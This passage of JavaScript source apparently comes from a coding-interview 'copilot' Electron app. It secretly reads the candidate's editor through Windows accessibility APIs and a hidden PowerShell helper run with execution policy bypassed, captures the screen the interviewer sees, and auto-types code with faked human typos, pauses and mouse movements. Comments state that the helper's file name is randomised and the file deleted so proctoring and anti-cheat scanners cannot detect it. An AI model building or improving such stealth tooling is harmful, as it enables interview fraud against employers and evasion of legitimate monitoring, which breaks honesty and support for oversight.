    autoTypePlanLog.record(_atRunId, {
      path: 'single-region',
      aborted: autoTypeAbort,
      abortReason: autoTypeAbortReason || null,
      abortDiagnostic: autoTypeAbortDiagnostic || null,
    });
    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
    // Pull abort reason + diagnostic into the 'done' broadcast so the renderer
    // never has to guess WHY a run ended. Without these fields the renderer
    // used to silently reset to idle on aborted=true, leaving the user with
    // no feedback (the "no indication" bug from v3.4.3).
    autoTypeBroadcast({
      phase: 'done',
      aborted: autoTypeAbort,
      reason: autoTypeAbortReason || undefined,
      hint: autoTypeAbortDiagnostic && autoTypeAbortDiagnostic.hint
        ? autoTypeAbortDiagnostic.hint : undefined,
      expected: autoTypeAbortDiagnostic && autoTypeAbortDiagnostic.expected
        ? autoTypeAbortDiagnostic.expected : undefined,
      actual: autoTypeAbortDiagnostic && autoTypeAbortDiagnostic.actual
        ? autoTypeAbortDiagnostic.actual : undefined,
      lineIndex: autoTypeAbortDiagnostic && autoTypeAbortDiagnostic.lineIndex
        ? autoTypeAbortDiagnostic.lineIndex : undefined,
    });
    autoTypeInFlight = false;
  }

  return { ok: !autoTypeAbort, aborted: autoTypeAbort, reason: autoTypeAbortReason || undefined };
});

// ───────────────────────────────────────────────
//  A11Y (Windows UIA) — read the focused editor's full text + cursor
//  position via the OS accessibility API. This is what screen readers use;
//  it's invisible to the target app (no `copy` event, no screenshot,
//  no JS hook in the page). Deterministic and instant once the bridge is
//  warm. Screenshots + Tesseract remain as a graceful fallback on non-
//  Windows platforms and on Windows targets that don't expose UIA.
//
//  Implementation: a persistent PowerShell process that speaks a tiny
//  line-based protocol (READ → JSON response). PowerShell is on every
//  Windows 10/11 machine; no native compile, no build tooling, no extra
//  npm dependency.
// ───────────────────────────────────────────────

const { spawn: _spawn } = require('child_process');
const _fs = require('fs');
const _os = require('os');
const _pathMod = require('path');
const _crypto = require('crypto');

// Per-session random filename for the UIA helper script. Replaces the
// previous hardcoded 'interview-copilot-uia-helper.ps1' so static scanners
// (anti-cheat / proctoring tools that enumerate %TEMP%) don't get a
// brand-identifying artifact handed to them. The file is always overwritten
// on app start, so the random name is regenerated each launch — also
// invalidates any blocklist a scanner built up against a prior session.
const _uiaScriptBaseName = _crypto.randomBytes(8).toString('hex') + '.ps1';

// PowerShell REPL. Uses TextPattern (best — full text + cursor offset) and
// falls back to ValuePattern (coarser — value only, cursor assumed at end).
// Writes `READY` once loaded so the Node side knows when the bridge is live.
const UIA_PS_SCRIPT = `# Pin stdout to UTF-8 so editor text containing non-ASCII (emoji, Unicode
# identifiers, curly quotes, etc.) round-trips cleanly to the Node side. On
# Windows the default console output encoding is often the legacy OEM code
# page, which silently replaces unrepresentable bytes with '?' and can
# produce JSON that won't parse.
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

Add-Type -AssemblyName UIAutomationClient -ErrorAction SilentlyContinue
Add-Type -AssemblyName UIAutomationTypes -ErrorAction SilentlyContinue

function Read-Focused {
  try {
    $el = [System.Windows.Automation.AutomationElement]::FocusedElement
    if ($null -eq $el) { return '{"ok":false,"error":"no_focus"}' }

    # Capture the owning process so the Node side can detect "focus is still
    # on our own Electron app" — typing into our own chat input is the most
    # common Auto-Type failure mode.
    $pid_ = 0
    $pname = ''
    try {
      $pid_ = [int]$el.Current.ProcessId
      if ($pid_ -gt 0) {
        $proc = Get-Process -Id $pid_ -ErrorAction SilentlyContinue
        if ($proc) { $pname = $proc.ProcessName }
      }
    } catch { }

    # The focused element's own NAME and control type. Cheap, and it is
    # the only way to tell that a chord actually opened the widget we
    # asked for — VS Code's go-to-line prompt names itself "Type a line
    # number to go to (from 1 to N)", which is both a confirmation and a
    # free read of the document's real length. Without this the caret
    # jump below could type a line number into a browser's find bar.
    $elName = ''
    $elType = ''
    try {
      $elName = [string]$el.Current.Name
      $elType = [string]$el.Current.ControlType.ProgrammaticName
    } catch { }

    $tp = $null
    $hasTp = $el.TryGetCurrentPattern([System.Windows.Automation.TextPattern]::Pattern, [ref]$tp)
    if ($hasTp -and $tp) {
      $docRange = $tp.DocumentRange
      $fullText = $docRange.GetText(-1)
      if ($null -eq $fullText) { $fullText = '' }
      $selections = $tp.GetSelection()
      $cursorOffset = $fullText.Length
      if ($selections -and $selections.Length -gt 0) {
        $sel = $selections[0]
        $probe = $docRange.Clone()
        $probe.MoveEndpointByRange([System.Windows.Automation.Text.TextPatternRangeEndpoint]::End, $sel, [System.Windows.Automation.Text.TextPatternRangeEndpoint]::Start)
        $before = $probe.GetText(-1)
        if ($null -eq $before) { $before = '' }
        $cursorOffset = $before.Length
      }
      $obj = [PSCustomObject]@{ ok = $true; text = $fullText; cursorOffset = $cursorOffset; source = 'text_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
      return ($obj | ConvertTo-Json -Compress -Depth 3)
    }

    $vp = $null
    $hasVp = $el.TryGetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern, [ref]$vp)
    if ($hasVp -and $vp) {
      $value = $vp.Current.Value
      if ($null -eq $value) { $value = '' }
      $obj = [PSCustomObject]@{ ok = $true; text = $value; cursorOffset = $value.Length; source = 'value_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
      return ($obj | ConvertTo-Json -Compress -Depth 3)
    }

    # No text/value pattern but we still know who has focus — let the Node
    # side decide whether that's our own process (abort) or an editor we
    # just can't read text from (let the user try anyway).
    $obj = [PSCustomObject]@{ ok = $false; error = 'no_pattern'; processId = $pid_; processName = $pname; elementName = $elName; elementType = $elType }
    return ($obj | ConvertTo-Json -Compress -Depth 3)
  } catch {
    $msg = $_.Exception.Message -replace '[\\r\\n]+',' '
    $obj = [PSCustomObject]@{ ok = $false; error = $msg }
    return ($obj | ConvertTo-Json -Compress -Depth 3)
  }
}

# Direct-to-stdout writes (not Write-Output) so the PowerShell object
# formatter can't interpose whitespace, wrap lines, or stream auxiliary
# text into our line-delimited JSON protocol.
[Console]::Out.WriteLine('READY')
[Console]::Out.Flush()

while ($true) {
  $line = [Console]::In.ReadLine()
  if ($null -eq $line) { break }
  $line = $line.Trim()
  if ($line -eq 'QUIT') { break }
  if ($line -eq 'READ') {
    $r = Read-Focused
    [Console]::Out.WriteLine($r)
    [Console]::Out.Flush()
  }
}
`;

let _uiaProc = null;
let _uiaReady = false;
let _uiaBuffer = '';
let _uiaQueue = [];
let _uiaScriptPath = null;
let _uiaInitFailed = false;

function _ensureUIAScriptFile() {
  if (_uiaScriptPath && _fs.existsSync(_uiaScriptPath)) return _uiaScriptPath;
  const p = _pathMod.join(_os.tmpdir(), _uiaScriptBaseName);
  // Always overwrite — guards against a stale partial write from a
  // previous crash leaving an incomplete script in place. Filename is
  // randomized per session (see _uiaScriptBaseName above) so a
  // proctoring / anti-cheat scanner can't glob the temp dir for a
  // known brand-identifying name.
  _fs.writeFileSync(p, UIA_PS_SCRIPT, 'utf8');
  _uiaScriptPath = p;
  return p;
}

// Best-effort cleanup of the helper script on app exit. Not load-bearing
// (Windows tmp gets cleaned periodically anyway) but removes the artifact
// promptly when the app shuts cleanly so it doesn't sit on disk between
// sessions for someone to find.
function _cleanupUIAScriptFile() {
  if (!_uiaScriptPath) return;
  try { _fs.unlinkSync(_uiaScriptPath); } catch (_) {}
  _uiaScriptPath = null;
}
app.on('will-quit', _cleanupUIAScriptFile);
// Release the display-sleep block on the way out (defensive — session-active
// false normally clears it, but a hard quit mid-session would skip that).
app.on('will-quit', stopDisplaySleepBlocker);

// Spawn once, reuse for the life of the app. If spawn fails, remember that
// so we don't thrash trying to restart a bridge that won't start.
function startUIABridge() {
  if (process.platform !== 'win32') return false;
  if (_uiaProc && !_uiaProc.killed) return true;
  if (_uiaInitFailed) return false;

  try {
    const scriptPath = _ensureUIAScriptFile();
    _uiaProc = _spawn('powershell.exe', [
      '-NoProfile',
      '-NonInteractive',
      '-ExecutionPolicy', 'Bypass',
      '-File', scriptPath,
    ], {
      windowsHide: true,
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    _uiaBuffer = '';
    _uiaReady = false;

    _uiaProc.stdout.setEncoding('utf8');
    _uiaProc.stdout.on('data', chunk => {
      _uiaBuffer += chunk;
      let idx;
      while ((idx = _uiaBuffer.indexOf('\n')) !== -1) {
        const line = _uiaBuffer.slice(0, idx).replace(/\r$/, '').trim();
        _uiaBuffer = _uiaBuffer.slice(idx + 1);
        if (!line) continue;
        if (line === 'READY') {
          _uiaReady = true;
          console.log('[auto-type] UIA bridge READY');
          continue;
        }
        // First char `{` — assume JSON response. Anything else is stray
        // stdout we ignore (e.g. a PowerShell warning that escaped).
        if (line[0] !== '{') continue;
        const q = _uiaQueue.shift();
        if (q && !q.done) {
          try { q.resolve(JSON.parse(line)); }
          catch (parseErr) {
            const preview = line.length > 200 ? line.slice(0, 200) + '…' : line;
            console.warn(`[uia] parse_error on response: ${preview}`);
            q.resolve({ ok: false, error: 'parse_error' });
          }
        }
      }
    });

    _uiaProc.stderr.setEncoding('utf8');
    _uiaProc.stderr.on('data', data => {
      if (process.env.DEBUG_UIA) console.warn('[uia:stderr]', data);
    });

    _uiaProc.on('exit', () => {
      _uiaProc = null;
      _uiaReady = false;
      // Release any still-pending callers so they don't hang forever.
      while (_uiaQueue.length) {
        const q = _uiaQueue.shift();
        if (q && !q.done) q.resolve({ ok: false, error: 'bridge_exited' });
      }
    });

    _uiaProc.on('error', err => {
      console.warn('[uia] bridge error:', err && err.message);
      _uiaInitFailed = true;
      _uiaProc = null;
    });

    return true;
  } catch (e) {
    console.warn('[uia] spawn failed:', e && e.message);
    _uiaInitFailed = true;
    _uiaProc = null;
    return false;
  }
}

// Read the focused element's text + cursor offset. Times out on its own so
// a hung PowerShell (shouldn't happen, but UIA queries CAN block on weird
// targets) doesn't freeze the Auto-Type flow.
//
// Cold-start handling: the PowerShell bridge takes 300ms–2s to spin up
// (process spawn + `Add-Type System.Windows.Automation` assembly load). If
// we send READ before the script's ReadLine loop exists, the byte sits in
// the pipe buffer but no response ever comes. Instead we gate the write on
// `_uiaReady` — the script prints 'READY' once its loop is live — and poll
// from here until that flag flips, all within the caller's total budget.
function readFocusedViaUIA(timeoutMs = 2500) {
  if (!startUIABridge()) {
    return Promise.resolve({ ok: false, error: 'bridge_unavailable' });
  }
  return new Promise(resolve => {
    let settled = false;
    let pollId = null;
    let queueEntry = null;

    const finish = (result) => {
      if (settled) return;
      settled = true;
      if (pollId) { clearInterval(pollId); pollId = null; }
      clearTimeout(hardTimer);
      if (queueEntry) {
        // Mark done but DO NOT splice the entry out of _uiaQueue. The
        // PowerShell bridge always emits exactly one response per READ
        // command, so a timed-out READ's response is still on its way.
        // The stdout handler matches responses to queue entries via a
        // FIFO shift() — if we splice the timed-out entry, that late
        // response gets handed to the NEXT queued entry and resolves it
        // with stale editor text (a real bug: SID checks can get fed
        // pre-typing snapshots and either false-abort or false-accept).
        // Leaving the entry in (marked done) lets the existing
        // `if (q && !q.done)` guard discard the late response cleanly,
        // and the next real response aligns with the next pending entry.
        queueEntry.done = true;
      }
      resolve(result);
    };

    const hardTimer = setTimeout(
      () => finish({ ok: false, error: _uiaReady ? 'timeout' : 'not_ready_timeout' }),
      timeoutMs
    );

    const issueRead = () => {
      if (settled) return;
      queueEntry = { done: false, resolve: (r) => finish(r) };
      _uiaQueue.push(queueEntry);
      try {
        _uiaProc.stdin.write('READ\n');
      } catch (e) {
        finish({ ok: false, error: 'write_failed' });
      }
    };

    if (_uiaReady) {
      issueRead();
    } else {
      // Poll every 40ms for READY. Cheap — bridge flips the flag from the
      // stdout data handler in the same event loop, so next tick sees it.
      pollId = setInterval(() => {
        if (settled) return;
        if (_uiaReady) {
          clearInterval(pollId);
          pollId = null;
          issueRead();
        }
      }, 40);
    }
  });
}

function killUIABridge() {
  try {
    if (_uiaProc && !_uiaProc.killed) {
      try { _uiaProc.stdin.write('QUIT\n'); } catch (_) {}
      try { _uiaProc.kill(); } catch (_) {}
    }
  } catch (_) {}
  _uiaProc = null;
  _uiaReady = false;
}

// ── UIA accessibility-placeholder detection (Stage 1 safety guard) ──
// Some editors refuse to expose real content to UI Automation unless an
// accessibility / screen-reader mode is switched on. The canonical case
// is VS Code, whose focused element returns the literal stub:
//   "The editor is not accessible at this time. To enable screen reader
//    optimized mode, use Shift+Alt+F1"
// Trusting that string as the editor's text causes THREE failures (all
// observed in run 9c6ddc12334a):
//   1. It's handed to the vision planner as "ground-truth editorText",
//      polluting its line-number reconciliation with nonsense.
//   2. executeMultiOpPlan's structural-safety filter checks IT instead of
//      the real code, so the filter is effectively blind.
//   3. It is ONE logical line, so the flat-UIA Ctrl+A whole-document path
//      false-triggers — a surgical plan becomes a whole-doc nuke.
// When detected we treat the read as UIA-blindness (empty text) so the
// screenshot vision planner takes over — which is the correct tool for
// these editors anyway. Matching is deliberately narrow: we only catch
// the known stubs, never real code that happens to mention these words.
function isUiaPlaceholderText(text) {
  if (typeof text !== 'string') return false;
  const t = text.trim();
  if (!t) return false;
  if (/editor is not accessible at this time/i.test(t)) return true;
  if (/screen reader optimized mode/i.test(t) && /shift\s*\+\s*alt\s*\+\s*f1/i.test(t)) return true;
  return false;
}

// Deterministic planner: given the editor's text + cursor + the code we're
// about to type, decide how many leading AND trailing lines of code to skip
// (because they're already present in the editor around the cursor). Also
// returns wipeFirstLine — when leading skip is non-zero, the cursor is sitting
// in whitespace that would stack on top of the first typed line's indent, so
// the main loop wipes the current line before typing starts.
//
// Rules:
//   • Empty editor → skip 0 / trailing 0 (type from top). Confidence 1.
//   • Cursor mid-line (non-whitespace content to its left) → skip 0, trailing
//     0, trust user position. Confidence 0.9 — we can't sanely auto-correct
//     from mid-line without risking overwrites.
//   • Cursor at line start → walk code's leading lines against editor lines
//     before cursor AND walk code's trailing lines against editor lines
//     below cursor. Blanks in either side are allowed as padding.
// ── Vision capture ──
// One-shot, fully-passive screenshot of the screen the user's cursor is
// on, captured IN the main process via desktopCapturer (no renderer
// round-trip, no getUserMedia, no visible artifact — nothing happens on
// screen, it's just a frame grab). Used post-countdown when UIA came
// back blind: the screenshot sees exactly what the human (and the
// interviewer) sees, which is the only way to read a virtual-scrolled
// browser editor's content from outside the browser.
//
// setContentProtection on OUR windows does NOT block this — it only
// stops OTHERS from capturing us; our own desktopCapturer is unaffected.
// And by the time this runs (post-countdown) our window is hidden anyway.
async function captureScreenForVision() {
  try {
    const cursorPt = screen.getCursorScreenPoint();
    const targetDisplay = screen.getDisplayNearestPoint(cursorPt);
    const scaleFactor = targetDisplay.scaleFactor || 1;
    // Capture at real pixel resolution so code text is crisp for the
    // vision model. Cap the long edge at 2560 so a 4K monitor doesn't
    // produce a needlessly huge payload (and slow upload).
    const rawW = Math.round(targetDisplay.size.width * scaleFactor);
    const rawH = Math.round(targetDisplay.size.height * scaleFactor);
    const longEdge = Math.max(rawW, rawH);
    const CAP = 2560;
    const shrink = longEdge > CAP ? CAP / longEdge : 1;
    const thumbW = Math.max(1, Math.round(rawW * shrink));
    const thumbH = Math.max(1, Math.round(rawH * shrink));

    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: thumbW, height: thumbH },
    });
    if (!sources || sources.length === 0) return null;

    // Multi-monitor: pick the source whose display_id matches the display
    // the cursor is on. Fall back to the first screen if no match (some
    // Windows builds report an empty display_id).
    let src = sources.find(s => String(s.display_id) === String(targetDisplay.id));
    if (!src) src = sources[0];
    const img = src.thumbnail;
    if (!img || img.isEmpty()) return null;

    const png = img.toPNG();
    if (!png || png.length < 100) return null;
    return { base64: png.toString('base64'), mediaType: 'image/png' };
  } catch (e) {
    console.warn('[auto-type] vision capture failed:', e && e.message);
    return null;
  }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  MULTI-OPERATION TYPING ENGINE (vision planner v2)
//
//  The vision planner now emits an ordered list of edit operations
//  (replace / insert / delete), each anchored to a DOCUMENT LINE NUMBER.
//  These three functions execute that plan. They're SEPARATE from the
//  single-region typing loop in auto-type:send — that loop is left 100%
//  untouched so the proven UIA / text-agent paths can't regress. The
//  shared low-level humanized helpers (autoTypeCharWithTypo, decision
//  pauses, word backtrack, indent-wipe, mouse twitch) ARE reused, so the
//  stealth behavior is identical.
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Humanized multi-line typer — char-by-char with the same realism layer
// the single-region path uses. No SID here: SID is an append-model
// integrity check; multi-op edits are discrete bounded regions.
// ── The line break between two typed lines ──
//
// Shared by BOTH typing paths. They were separate copies once and the
// multi-op copy lost a guard the legacy one still had; the divergence is
// what produced the failures in .autotype-plans.jsonl.
//
// Sequence, and why each step is there:
//   1. Shift+End  — selects whatever the editor parked AFTER the caret.
//      When the line we just typed ends with `{`, `(` or `[`, Monaco /
//      CodeMirror auto-closed it, so a matching closer is sitting there.
//      If we press Enter with it in place, the editor pushes that closer
//      onto its own line below and the code's OWN closer, typed later,
//      becomes a duplicate — one surplus `}` per block, so nothing
//      compiles. Selecting it here means Enter consumes it. When there is
//      no auto-closer the selection is empty and this is a no-op.
//   2. Enter      — deletes that selection, then splits the line.
//   3. Home + Shift+End — selects whatever indentation the editor
//      auto-inserted on the new line.
//
// The caller then types the next line; its FIRST character replaces the
// selection, so the code's own leading whitespace stands alone instead of
// compounding with the editor's.
//
// NOTHING IS EVER DELETED HERE. The old code ended step 3 with a Delete,
// which is correct only when the editor actually auto-indented. When it
// did not — every column-0 line, every blank line — the selection was
// empty and Delete became a FORWARD delete that merged the next document
// line onto this one, silently swallowing the platform's driver code
// (`import osif __name__ == "__main__":`). Typing over the selection is
// correct in both cases and needs no prediction about the editor.
async function autoTypeLineBreak(keyboard, Key) {
  const shiftEnd = async () => {
    await withHeldKey(keyboard, Key.LeftShift, async () => {
      await autoTypeNavSleep(5, 14);
      await autoTypePressWithDwell(keyboard, Key.End);
      await autoTypeNavSleep(5, 14);
    });
    await autoTypeNavSleep(14, 32);
  };
  await shiftEnd();                                       // 1
  await autoTypePressWithDwell(keyboard, Key.Enter);      // 2
  await autoTypeNavSleep(38, 70);
  await autoTypePressWithDwell(keyboard, Key.Home);       // 3
  await autoTypeNavSleep(14, 32);
  await shiftEnd();
}

// Collapse a selection left live by autoTypeLineBreak. Only matters when
// the last line typed was empty (nothing replaced the selected indent) —
// leaving a live selection means the user's next keystroke would wipe it.
async function autoTypeCollapseSelection(keyboard, Key) {
  try {
    await autoTypePressWithDwell(keyboard, Key.End);
    await autoTypeNavSleep(10, 22);
  } catch (_) { /* cosmetic only */ }
}

// Remove anything the editor parked after the caret at the END of a typed
// block. autoTypeLineBreak consumes an auto-inserted closer only when
// another line follows; when the LAST line ends with `{` / `(` / `[` — a
// single-line op replacing a method signature, say — the closer survives.
// Recorded run 5e0f… ended with `main(String[] args) throws Exception {}`
// and the whole body typed after the closed brace.
//
// A plain Delete cannot be used: with nothing parked, Delete is a forward
// delete that merges the following line (the defect this whole change
// removes). Instead select to end of line and type a throwaway character —
// that REPLACES a non-empty selection and merely inserts when the selection
// is empty — then Backspace it away. Residue-free in one case, byte
// identical in the other, with no prediction about the editor.
//
// Multi-op path only: there the executor cleared the line before typing, so
// the only thing that can be after the caret is editor-inserted. The legacy
// path can legitimately have the user's own text after the cursor
// (planAutoTypeFromUIA's `cursor_mid_line`), so it just collapses instead.
async function autoTypeConsumeTrailingResidue(keyboard, Key) {
  try {
    await withHeldKey(keyboard, Key.LeftShift, async () => {
      await autoTypeNavSleep(5, 14);
      await autoTypePressWithDwell(keyboard, Key.End);
      await autoTypeNavSleep(5, 14);
    });
    await autoTypeNavSleep(10, 22);
    await typeCharHumanly(keyboard, Key, ' ');
    await autoTypeNavSleep(18, 40);
    await autoTypePressWithDwell(keyboard, Key.Backspace);
    await autoTypeNavSleep(10, 22);
  } catch (e) {
    console.warn('[auto-type] trailing-residue cleanup failed (non-fatal):', e && e.message);
  }
}

async function typeLinesHumanized(lines, ctx) {
  const { keyboard, Key, mouse } = ctx;
  let prevCh = null;
  let prevLineTextForBlockCheck = null;
  // ── P3c: stop fighting the IDE's auto-indent ──
  // Set by the inter-line logic when we predict the IDE will pre-supply
  // indentation that matches (or under-shoots) what we need for the next
  // line. In those cases, we DON'T wipe + we skip typing the leading
  // whitespace — letting the IDE do its job, the way a real coder would.
  // Real humans type code into Monaco/CodeMirror EXPECTING auto-indent;
  // wiping it and re-typing literal 4-space runs is the most uncanny tell
  // in the current humanization stack.
  let skipLeadingChars = 0;
  for (let li = 0; li < lines.length; li++) {
    if (autoTypeAbort) break;
    const line = lines[li];

    let indentEnd = 0;
    // P8-3a: count both spaces AND tabs. The old loop only counted ' ',
    // so a tab-indented line registered indentEnd=0 → predictedIndent
    // miscounted → next-line skipLeadingChars over-skipped and ate the
    // first letter of identifiers (bug: `def` → `ef`).
    while (indentEnd < line.length && (line[indentEnd] === ' ' || line[indentEnd] === '\t')) indentEnd++;
    const prevEndsBlock = !!prevLineTextForBlockCheck && /[:{]\s*$/.test(prevLineTextForBlockCheck);
    // Indent-mistake operates on the REMAINING indent we'll actually type
    // after the IDE pre-supplied its share. When skipLeadingChars covers
    // the whole indent (IDE got it exactly right), there's no indent for
    // us to mis-type — helper sees 0 and short-circuits.
    const remainingIndentToType = Math.max(0, indentEnd - skipLeadingChars);
    if (remainingIndentToType > 0 && prevEndsBlock) {
      await autoTypeMaybeIndentMistake(keyboard, Key, remainingIndentToType, true);
    }

    // P8-3b: HARD GUARD against eating non-whitespace chars at line start.
    // The predictor (P3c, line ~4152) sets skipLeadingChars based on what
    // it ASSUMES the IDE will auto-indent. If the editor doesn't auto-indent
    // (or our predictor over-counts), this skip would silently consume the
    // first letters of the line — visible symptom: `def` → `ef`,
    // `Scanner` → `canner`, etc. Refuse to skip any non-whitespace char.
    if (skipLeadingChars > 0) {
      for (let k = 0; k < skipLeadingChars; k++) {
        if (k >= line.length || (line[k] !== ' ' && line[k] !== '\t')) {
          console.warn(`[auto-type] indent-skip guard: refusing to skip ${skipLeadingChars} chars on line "${line.slice(0, 24).replace(/\n/g, '\\n')}" — would eat non-whitespace at col ${k}. Typing full line from col 0.`);
          skipLeadingChars = 0;
          break;
        }
      }
    }
    let ci = skipLeadingChars;
    skipLeadingChars = 0;  // reset; inter-line logic below may set it for next iter
    while (ci < line.length) {
      if (autoTypeAbort) break;
      const ch = line[ci];
      const prePause = autoTypeDecisionPause(ch, prevCh);
      if (prePause > 0) await autoTypeSleep(prePause);
      if (/[a-zA-Z_]/.test(ch) && (!prevCh || !/[a-zA-Z0-9_]/.test(prevCh))) {
        let wj = ci + 1;
        while (wj < line.length && /[a-zA-Z0-9_]/.test(line[wj])) wj++;
        const word = line.slice(ci, wj);
        const didBacktrack = await autoTypeMaybeBacktrackWord(keyboard, Key, word);
        if (didBacktrack) { prevCh = word[word.length - 1]; ci = wj; continue; }
        // P5b: Autocomplete acceptance via Tab (multi-op path).
        const didAutocomplete = await autoTypeMaybeAutocomplete(keyboard, Key, word, prevCh);
        if (didAutocomplete) { prevCh = word[word.length - 1]; ci = wj; continue; }
      }
      try {
        await autoTypeCharWithTypo(keyboard, Key, ch, prevCh);
      } catch (chErr) {
        console.warn('[auto-type] char skipped:', JSON.stringify(ch), chErr && chErr.message);
      }
      await autoTypeSleep(autoTypeHumanDelay(ch, prevCh));
      prevCh = ch;
      ci++;
    }

    if (li < lines.length - 1 && !autoTypeAbort) {
      const nextLine = lines[li + 1] || '';
      let nextIndent = 0;
      // P8-3a: count tabs too (see indentEnd above for rationale).
      while (nextIndent < nextLine.length && (nextLine[nextIndent] === ' ' || nextLine[nextIndent] === '\t')) nextIndent++;
      const atBlockBoundary = nextLine.trim() === '' ||
        (indentEnd > 0 && nextLine.trim() !== '' && nextIndent < indentEnd);
      const dwell = atBlockBoundary ? 320 + Math.random() * 820 : 250 + Math.random() * 450;
      await autoTypeSleep(dwell);
      if (mouse) await autoTypeMaybeMouseTwitch(mouse);

      // ── P4: tool-switch pause ──
      // Real coders consult docs / lookup syntax ~35 times/hour (Jellyfish
      // study). ~1% per line at ~30 lines/run = 1-2 pauses per typical
      // solution. Pareto-tailed duration: median ~3s, occasional 15s+.
      // Capped at 30s to bound worst-case.
      if (Math.random() < 0.012) {
        const pause = Math.min(2000 + autoTypePareto(2.0, 1500), 30000);
        await autoTypeSleep(Math.round(pause));
      }

      // Line break: consume any auto-inserted closer, split, then leave the
      // editor's auto-indent SELECTED so the next line types over it.
      // See autoTypeLineBreak for the full rationale — in particular why
      // nothing here may Delete.
      try {
        await autoTypeLineBreak(keyboard, Key);
      } catch (kErr) {
        console.warn('[auto-type] line-break failed:', kErr && kErr.message);
      }
      // Type the next line's full indentation ourselves (no predict-skip).
      skipLeadingChars = 0;
      prevCh = null;
    }
    prevLineTextForBlockCheck = line;
  }
  // Clear anything the editor parked after the caret (auto-closer from a
  // final line ending in an opener), which also collapses the selection
  // autoTypeLineBreak leaves live when the last line was empty.
  if (!autoTypeAbort) await autoTypeConsumeTrailingResidue(keyboard, Key);
}

// Move the caret to the start of a 1-indexed DOCUMENT line via an
// ABSOLUTE reference: Ctrl+Home (→ line 1, col 0), counted Down, Home.
// Counted arrows are invisible on screen-share — indistinguishable from
// a human navigating. Ctrl+Home briefly scrolls to the top, but it's the
// only reliable absolute anchor across Monaco / CodeMirror / native
// inputs, and it's a keystroke humans use constantly.
// Land the caret at TRUE column 0 of the current line.
//
// Monaco / VS Code / CodeMirror implement "smart home": the FIRST Home
// press goes to the first NON-WHITESPACE character, a second press goes to
// column 0, and a third toggles back. Measured, not assumed — see
// server/scripts/probe-home-key.cjs, which types a marker after each
// variant and reads the file back.
//
// The navigators used a single Home, so on an indented line they stopped at
// the indent instead of column 0. selectLineRangeContent then anchored
// there, leaving the leading whitespace unselected and undeleted, and the
// replacement's own indentation was typed on top of it — 16 spaces where 8
// were intended. Visible in recorded run 5e0f… and reproduced in real
// VS Code before this fix.
//
// Anchoring at End first makes the two presses deterministic: from End the
// first press lands on smart-home and the second on column 0 — verified for
// indented, unindented, whitespace-only and empty lines alike.
async function autoTypeGoToColumnZero(keyboard, Key) {
  await autoTypePressWithDwell(keyboard, Key.End);
  await autoTypeNavSleep(8, 18);
  await autoTypePressWithDwell(keyboard, Key.Home);
  await autoTypeNavSleep(8, 18);
  await autoTypePressWithDwell(keyboard, Key.Home);
  await autoTypeNavSleep(10, 24);
}

// ── Arrow runs: tap for a hop, key-repeat for a distance ──
//
// Moving N lines used to be N deliberate taps: ~85ms dwell + ~130ms gap,
// so ~215ms per line. Reaching line 30 took over six seconds of the caret
// stepping down one row at a time, and the justification — "counted arrows
// are indistinguishable from a human navigating" — is only true for SHORT
// hops. Nobody presses Down twenty-nine times. They HOLD the key.
//
// What holding a key actually produces is a typematic delay (~250ms on
// Windows by default) followed by a fast even repeat (~31ms). So for
// anything past a few lines we keep the presses COUNTED — the count is
// what makes navigation deterministic, and we are not giving that up — but
// send them at repeat cadence instead of tap cadence. Same landing line,
// a fraction of the time, and on screen it reads as someone holding the
// key rather than jabbing it.
//
// Dwell is deliberately short in the repeat phase: an auto-repeated key
// emits events with near-zero dwell, so that IS the faithful signature.
async function autoTypeArrowRun(keyboard, key, count) {
  if (!(count > 0)) return;
  // The first press is always a real, deliberate keystroke.
  await autoTypePressWithDwell(keyboard, key);
  if (count === 1) return;

  if (count <= 3) {
    // A short hop — people tap these out rather than hold.
    for (let i = 1; i < count; i++) {
      if (autoTypeAbort) return;
      await autoTypeHumanNavSleep();
      await autoTypePressWithDwell(keyboard, key);
    }
    await autoTypeNavSleep(40, 90);
    return;
  }

  // Longer move: typematic delay, then the repeat burst.
  await autoTypeSleep(190 + Math.random() * 130);
  for (let i = 1; i < count; i++) {
    if (autoTypeAbort) return;
    await withHeldKey(keyboard, key, async () => {
      await autoTypeSleep(7 + Math.random() * 7);
    });
    await autoTypeSleep(19 + Math.random() * 15);
  }
  // The beat after letting go, before doing anything with the caret.
  await autoTypeSleep(130 + Math.random() * 200);
}

// Furthest we'll walk with arrow keys rather than re-anchoring. About a
// screen and a half — the distance a person actually covers by holding an
// arrow key. Past that they'd scroll or jump, and so do we.
const RELATIVE_NAV_MAX_LINES = 40;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  JUMPING, INSTEAD OF WALKING
//
//  Reaching line 30 used to mean Ctrl+Home followed by twenty-nine Down
//  presses — the caret visibly crawling from the top of the file, and
//  the cost growing with the line number (measured in real VS Code:
//  3.2s to line 30, and it scales linearly from there).
//
//  Every editor worth typing into has go-to-line on Ctrl+G, and it is
//  constant-time and exact. The reason it was not already used is the
//  real risk: if the chord is unbound, or a browser claims it for "find
//  again", then the digits we type next go somewhere we did not intend.
//
//  So we do not assume. We press the chord and ASK WHAT OPENED. The
//  prompt names itself — VS Code's reads "Type a line number to go to
//  (from 1 to 41)" — and only when we recognise it do we type anything.
//  Anything else gets Escape and the old walk, unchanged.
//
//  Two honest limitations, both chosen deliberately:
//   • The match is on English prompt text. A localised editor falls back
//     to walking — slower, never wrong. Recognising the widget by shape
//     alone cannot distinguish go-to-line from a find bar, and guessing
//     wrong is the one outcome that must not happen.
//   • It works in DOCUMENT line numbers, which is exactly what the
//     absolute navigator it replaces already used. It is deliberately
//     NOT used on the relative/UIA path, where line numbers mean
//     something different (see navigateToUiaLine).
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// A prompt ASKING for a line number, in the editors that ship one.
//
